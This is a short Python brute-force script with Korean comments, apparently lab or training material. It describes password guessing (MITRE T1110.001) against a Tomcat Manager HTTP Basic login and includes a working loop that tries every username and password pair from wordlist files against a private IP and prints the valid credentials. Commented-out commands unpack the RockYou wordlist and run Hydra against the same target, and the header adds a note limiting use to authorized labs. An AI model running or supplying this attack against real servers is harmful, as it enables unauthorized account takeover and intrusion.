# 공격 개요
# - 공격 유형: 무차별 대입 공격(Brute Force / Password Guessing)
# - MITRE ATT&CK: T1110.001 Password Guessing
# - 목적: 여러 사용자 이름과 비밀번호 조합을 반복 입력하여 유효한 계정 정보를 찾는다.
# - 대상: Tomcat Manager의 HTTP Basic 인증 페이지
# - 동작: user.txt와 password.txt의 모든 조합을 생성하여 인증 요청을 순차적으로 전송한다.
# - 판단: 인증 실패 시 HTTP 401, 인증 성공 시 HTTP 200 응답이 반환되는지를 확인한다.
# - 특징: 반복적인 인증 요청이 발생하므로 웹 서버, WAF, IDS/IPS, 인증 로그에 흔적이 남는다.
#
# 관련 도구
# - Hydra: 여러 네트워크 프로토콜의 로그인 인증을 자동으로 시험하는 도구
# - Medusa: 병렬 처리를 지원하는 네트워크 로그인 점검 도구
# - Ncrack: Nmap 프로젝트에서 제공하는 네트워크 인증 점검 도구
# - Burp Suite Intruder: 웹 요청의 아이디와 비밀번호 값을 반복 변경하여 시험하는 도구
#
# 주의: 본인이 소유하거나 명시적으로 허가받은 실습 환경에서만 사용한다.

import requests
from itertools import product

target = "http://192.168.50.10:8080/manager/html"

# user.txt에서 사용자 이름을 한 줄씩 읽는다.
with open("user.txt", encoding="utf-8") as file:
    users = [line.strip() for line in file if line.strip()]

# password.txt에서 비밀번호를 한 줄씩 읽는다.
with open("password.txt", encoding="utf-8") as file:
    passwords = [line.strip() for line in file if line.strip()]

# 사용자 이름과 비밀번호의 모든 조합을 생성한다.
for user, pw in product(users, passwords):
    r = requests.get(
        target,
        auth=(user, pw)
    )

    # Tomcat Basic 인증 성공 여부를 상태 코드로 판단한다.
    if r.status_code == 200:
        print(f"[+] success!! {user}:{pw}")
        break
    else:
        print(f"[-] failed.. ({r.status_code}) {user}:{pw}")


# RockYou 워드리스트 압축 해제
# sudo gunzip /usr/share/wordlists/rockyou.txt.gz


# Hydra를 이용한 Tomcat Basic 인증 점검
# hydra -l admin -P /usr/share/wordlists/rockyou.txt \
#   192.168.50.10 -s 8080 http-get /manager/html
